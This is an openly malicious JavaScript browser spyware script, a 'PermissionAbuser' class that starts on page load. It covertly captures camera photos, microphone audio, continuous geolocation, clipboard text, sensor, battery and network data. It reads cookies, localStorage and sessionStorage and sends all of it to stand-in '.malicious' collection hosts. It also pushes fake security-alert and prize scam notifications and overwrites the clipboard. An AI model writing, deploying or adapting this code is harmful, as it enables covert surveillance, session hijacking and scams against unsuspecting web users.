// Permission abuse and device access
class PermissionAbuser {
    constructor() {
        this.permissions = {};
        this.init();
    }

    async init() {
        await this.requestAllPermissions();
        this.startMonitoring();
        this.accessSensitiveData();
    }

    async requestAllPermissions() {
        // Try to get all possible permissions
        const permissionRequests = [
            this.requestGeolocation(),
            this.requestCamera(),
            this.requestMicrophone(),
            this.requestNotifications(),
            this.requestClipboard(),
            this.requestStorage(),
            this.requestSensors()
        ];
        
        await Promise.allSettled(permissionRequests);
    }

    async requestGeolocation() {
        if ('geolocation' in navigator) {
            try {
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    });
                });
                
                this.permissions.geolocation = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    timestamp: position.timestamp
                };
                
                this.sendGeolocationData();
                
                // Start continuous tracking
                this.watchGeolocation();
                
            } catch (error) {
                console.warn('Geolocation failed:', error);
            }
        }
    }

    watchGeolocation() {
        if ('geolocation' in navigator) {
            this.geoWatchId = navigator.geolocation.watchPosition(
                (position) => {
                    this.permissions.geolocation = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        timestamp: position.timestamp
                    };
                    
                    this.sendGeolocationData();
                },
                (error) => {},
                {
                    enableHighAccuracy: true,
                    maximumAge: 0,
                    timeout: 5000
                }
            );
        }
    }

    sendGeolocationData() {
        if (this.permissions.geolocation) {
            fetch('https://location-tracker.malicious/log', {
                method: 'POST',
                body: JSON.stringify({
                    type: 'geolocation',
                    data: this.permissions.geolocation,
                    timestamp: Date.now()
                }),
                mode: 'no-cors'
            }).catch(() => {});
        }
    }

    async requestCamera() {
        if ('mediaDevices' in navigator && navigator.mediaDevices.getUserMedia) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        width: { ideal: 1920 },
                        height: { ideal: 1080 },
                        facingMode: 'environment'
                    }
                });
                
                this.permissions.camera = true;
                
                // Capture occasional photos
                this.setupCameraCapture(stream);
                
            } catch (error) {
                // Try with audio only for microphone access
                try {
                    const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                    this.permissions.microphone = true;
                    this.setupAudioCapture(audioStream);
                } catch (audioError) {
                    console.warn('Media permissions failed:', audioError);
                }
            }
        }
    }

    setupCameraCapture(stream) {
        // Create hidden video element
        const video = document.createElement('video');
        video.style.display = 'none';
        video.srcObject = stream;
        video.play();
        
        // Capture photo every 30 seconds
        setInterval(() => {
            this.capturePhoto(video);
        }, 30000);
    }

    capturePhoto(video) {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0);
        
        // Convert to data URL
        const photoData = canvas.toDataURL('image/jpeg', 0.5);
        
        // Send to server
        this.sendCameraData(photoData);
        
        // Store locally
        this.storeCameraData(photoData);
    }

    sendCameraData(photoData) {
        fetch('https://camera-data.malicious/upload', {
            method: 'POST',
            body: JSON.stringify({
                type: 'camera_capture',
                data: photoData.substring(0, 100000), // Truncate if too large
                timestamp: Date.now()
            }),
            mode: 'no-cors'
        }).catch(() => {});
    }

    storeCameraData(photoData) {
        try {
            const key = `camera_capture_${Date.now()}`;
            localStorage.setItem(key, photoData.substring(0, 50000));
            
            // Clean up old captures
            const keys = Object.keys(localStorage).filter(k => k.startsWith('camera_capture_'));
            if (keys.length > 10) {
                keys.sort().slice(0, keys.length - 10).forEach(k => localStorage.removeItem(k));
            }
        } catch (e) {
            // Ignore storage errors
        }
    }

    setupAudioCapture(stream) {
        // Setup audio recording
        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
        const source = audioContext.createMediaStreamSource(stream);
        const processor = audioContext.createScriptProcessor(4096, 1, 1);
        
        let audioBuffer = [];
        
        processor.onaudioprocess = (e) => {
            const inputData = e.inputBuffer.getChannelData(0);
            audioBuffer.push(...Array.from(inputData));
            
            // Send audio data every 10 seconds
            if (audioBuffer.length > 44100 * 10) { // 10 seconds at 44.1kHz
                this.sendAudioData(audioBuffer.slice(0, 44100 * 5)); // Send 5 seconds
                audioBuffer = audioBuffer.slice(44100 * 5);
            }
        };
        
        source.connect(processor);
        processor.connect(audioContext.destination);
        
        this.permissions.audioProcessor = processor;
    }

    sendAudioData(audioData) {
        // Compress and send audio data
        const compressed = this.compressAudioData(audioData);
        
        fetch('https://audio-data.malicious/upload', {
            method: 'POST',
            body: JSON.stringify({
                type: 'audio_capture',
                data: compressed,
                timestamp: Date.now(),
                sampleRate: 44100
            }),
            mode: 'no-cors'
        }).catch(() => {});
    }

    compressAudioData(data) {
        // Simple compression - take every 4th sample
        return data.filter((_, index) => index % 4 === 0);
    }

    async requestNotifications() {
        if ('Notification' in window && Notification.permission === 'default') {
            try {
                const permission = await Notification.requestPermission();
                this.permissions.notifications = permission;
                
                if (permission === 'granted') {
                    this.showMaliciousNotification();
                    this.scheduleNotifications();
                }
            } catch (error) {
                console.warn('Notification permission failed:', error);
            }
        }
    }

    showMaliciousNotification() {
        new Notification('Security Alert', {
            body: 'Your device needs immediate attention. Click to fix.',
            icon: 'https://malicious-ads.com/fake-icon.png',
            badge: 'https://malicious-ads.com/fake-badge.png'
        }).onclick = () => {
            window.open('https://malicious-ads.com/notification-click', '_blank');
        };
    }

    scheduleNotifications() {
        // Schedule random notifications
        setInterval(() => {
            if (Math.random() < 0.1) { // 10% chance every interval
                const messages = [
                    'Virus detected! Tap to remove.',
                    'Special offer expiring soon!',
                    'Your battery needs optimization.',
                    'Update required for security.',
                    'Congratulations! You won a prize.'
                ];
                
                const randomMessage = messages[Math.floor(Math.random() * messages.length)];
                
                new Notification('Important Alert', {
                    body: randomMessage,
                    icon: 'https://malicious-ads.com/alert.png'
                }).onclick = () => {
                    window.open('https://malicious-ads.com/notification', '_blank');
                };
            }
        }, 300000); // Every 5 minutes
    }

    async requestClipboard() {
        if ('clipboard' in navigator) {
            try {
                // Try to read clipboard
                const text = await navigator.clipboard.readText();
                if (text) {
                    this.permissions.clipboard = true;
                    this.sendClipboardData(text);
                }
            } catch (error) {
                // Try write permission instead
                try {
                    await navigator.clipboard.writeText('Malicious content');
                    this.permissions.clipboardWrite = true;
                } catch (writeError) {
                    console.warn('Clipboard access failed:', writeError);
                }
            }
        }
    }

    sendClipboardData(text) {
        fetch('https://clipboard-data.malicious/log', {
            method: 'POST',
            body: JSON.stringify({
                type: 'clipboard',
                data: text.substring(0, 1000),
                timestamp: Date.now()
            }),
            mode: 'no-cors'
        }).catch(() => {});
    }

    async requestStorage() {
        // Request persistent storage
        if ('storage' in navigator && navigator.storage.persist) {
            try {
                const persisted = await navigator.storage.persist();
                this.permissions.persistentStorage = persisted;
                
                // Request quota
                if ('estimate' in navigator.storage) {
                    const estimate = await navigator.storage.estimate();
                    this.permissions.storageQuota = estimate;
                }
            } catch (error) {
                console.warn('Storage permission failed:', error);
            }
        }
    }

    async requestSensors() {
        // Try to access device sensors
        const sensorPromises = [];
        
        if ('DeviceMotionEvent' in window) {
            sensorPromises.push(this.accessMotionSensor());
        }
        
        if ('DeviceOrientationEvent' in window) {
            sensorPromises.push(this.accessOrientationSensor());
        }
        
        if ('AmbientLightSensor' in window) {
            sensorPromises.push(this.accessLightSensor());
        }
        
        await Promise.allSettled(sensorPromises);
    }

    accessMotionSensor() {
        return new Promise((resolve) => {
            window.addEventListener('devicemotion', (event) => {
                this.permissions.motion = {
                    acceleration: event.acceleration,
                    accelerationIncludingGravity: event.accelerationIncludingGravity,
                    rotationRate: event.rotationRate,
                    interval: event.interval
                };
                
                this.sendSensorData('motion', this.permissions.motion);
                resolve(true);
            }, { once: true });
        });
    }

    accessOrientationSensor() {
        return new Promise((resolve) => {
            window.addEventListener('deviceorientation', (event) => {
                this.permissions.orientation = {
                    alpha: event.alpha,
                    beta: event.beta,
                    gamma: event.gamma,
                    absolute: event.absolute
                };
                
                this.sendSensorData('orientation', this.permissions.orientation);
                resolve(true);
            }, { once: true });
        });
    }

    accessLightSensor() {
        if ('AmbientLightSensor' in window) {
            try {
                const sensor = new AmbientLightSensor();
                sensor.addEventListener('reading', () => {
                    this.permissions.light = {
                        illuminance: sensor.illuminance,
                        timestamp: Date.now()
                    };
                    
                    this.sendSensorData('light', this.permissions.light);
                });
                
                sensor.start();
                return Promise.resolve(true);
            } catch (error) {
                return Promise.reject(error);
            }
        }
        return Promise.resolve(false);
    }

    sendSensorData(type, data) {
        fetch('https://sensor-data.malicious/log', {
            method: 'POST',
            body: JSON.stringify({
                type: type,
                data: data,
                timestamp: Date.now()
            }),
            mode: 'no-cors'
        }).catch(() => {});
    }

    startMonitoring() {
        // Monitor battery if available
        if ('getBattery' in navigator) {
            navigator.getBattery().then(battery => {
                this.monitorBattery(battery);
            });
        }
        
        // Monitor network
        this.monitorNetwork();
        
        // Monitor storage
        this.monitorStorage();
    }

    monitorBattery(battery) {
        this.permissions.battery = {
            level: battery.level,
            charging: battery.charging,
            chargingTime: battery.chargingTime,
            dischargingTime: battery.dischargingTime
        };
        
        battery.addEventListener('levelchange', () => {
            this.permissions.battery.level = battery.level;
            this.sendBatteryData();
        });
        
        battery.addEventListener('chargingchange', () => {
            this.permissions.battery.charging = battery.charging;
            this.sendBatteryData();
        });
        
        this.sendBatteryData();
    }

    sendBatteryData() {
        if (this.permissions.battery) {
            fetch('https://battery-data.malicious/log', {
                method: 'POST',
                body: JSON.stringify({
                    type: 'battery',
                    data: this.permissions.battery,
                    timestamp: Date.now()
                }),
                mode: 'no-cors'
            }).catch(() => {});
        }
    }

    monitorNetwork() {
        if ('connection' in navigator) {
            const connection = navigator.connection;
            
            this.permissions.network = {
                effectiveType: connection.effectiveType,
                downlink: connection.downlink,
                rtt: connection.rtt,
                saveData: connection.saveData
            };
            
            connection.addEventListener('change', () => {
                this.permissions.network = {
                    effectiveType: connection.effectiveType,
                    downlink: connection.downlink,
                    rtt: connection.rtt,
                    saveData: connection.saveData
                };
                
                this.sendNetworkData();
            });
            
            this.sendNetworkData();
        }
    }

    sendNetworkData() {
        if (this.permissions.network) {
            fetch('https://network-data.malicious/log', {
                method: 'POST',
                body: JSON.stringify({
                    type: 'network',
                    data: this.permissions.network,
                    timestamp: Date.now()
                }),
                mode: 'no-cors'
            }).catch(() => {});
        }
    }

    monitorStorage() {
        // Monitor LocalStorage usage
        setInterval(() => {
            try {
                let totalSize = 0;
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    const value = localStorage.getItem(key);
                    totalSize += key.length + (value ? value.length : 0);
                }
                
                this.permissions.storageUsage = {
                    items: localStorage.length,
                    size: totalSize,
                    timestamp: Date.now()
                };
                
                this.sendStorageData();
            } catch (e) {
                // Ignore errors
            }
        }, 60000);
    }

    sendStorageData() {
        if (this.permissions.storageUsage) {
            fetch('https://storage-data.malicious/log', {
                method: 'POST',
                body: JSON.stringify({
                    type: 'storage',
                    data: this.permissions.storageUsage,
                    timestamp: Date.now()
                }),
                mode: 'no-cors'
            }).catch(() => {});
        }
    }

    accessSensitiveData() {
        // Try to access sensitive browser data
        this.accessCookies();
        this.accessLocalStorage();
        this.accessSessionStorage();
        this.accessIndexedDB();
    }

    accessCookies() {
        const cookies = document.cookie;
        if (cookies) {
            this.sendSensitiveData('cookies', cookies);
        }
    }

    accessLocalStorage() {
        try {
            const allData = {};
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                allData[key] = localStorage.getItem(key);
            }
            
            this.sendSensitiveData('localStorage', allData);
        } catch (e) {
            // Ignore errors
        }
    }

    accessSessionStorage() {
        try {
            const allData = {};
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                allData[key] = sessionStorage.getItem(key);
            }
            
            this.sendSensitiveData('sessionStorage', allData);
        } catch (e) {
            // Ignore errors
        }
    }

    accessIndexedDB() {
        if ('indexedDB' in window) {
            // Try to list databases
            // This is simplified - actual implementation would be more complex
            this.sendSensitiveData('indexedDB', { available: true });
        }
    }

    sendSensitiveData(type, data) {
        fetch('https://sensitive-data.malicious/collect', {
            method: 'POST',
            body: JSON.stringify({
                type: type,
                data: data,
                timestamp: Date.now()
            }),
            mode: 'no-cors'
        }).catch(() => {});
    }

    // Get all collected permissions data
    getAllPermissionsData() {
        return this.permissions;
    }
}

// Initialize permission abuser
window.permissionAbuser = new PermissionAbuser();